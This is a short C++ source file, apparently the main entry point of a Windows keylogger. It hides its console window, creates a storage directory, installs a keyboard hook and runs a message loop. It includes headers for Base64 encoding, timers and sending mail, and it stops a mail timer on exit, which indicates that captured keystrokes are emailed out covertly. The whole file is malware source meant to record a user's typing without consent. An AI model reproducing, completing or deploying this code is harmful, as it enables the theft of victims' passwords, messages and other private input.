#include <iostream>
#include <windows.h>
#include "stdafx.h"
#include "Helper.h"
#include "KeybHook.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	IO::MkDir(IO::GetOurPath(true));
	//Install subroutine to monitor the message traffic
	InstalHook();

	//&Msg is the out parameter
	//hWnd, wMsgFilterMin, wMsgFilterMax are null, 0, 0 to get all messages
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		//Translate messages for the system
		TranslateMessage(&msg);
		//Forwards the message to the system
		DispatchMessage(&msg);
	}

	MailTimer.Stop();
	return 0;
}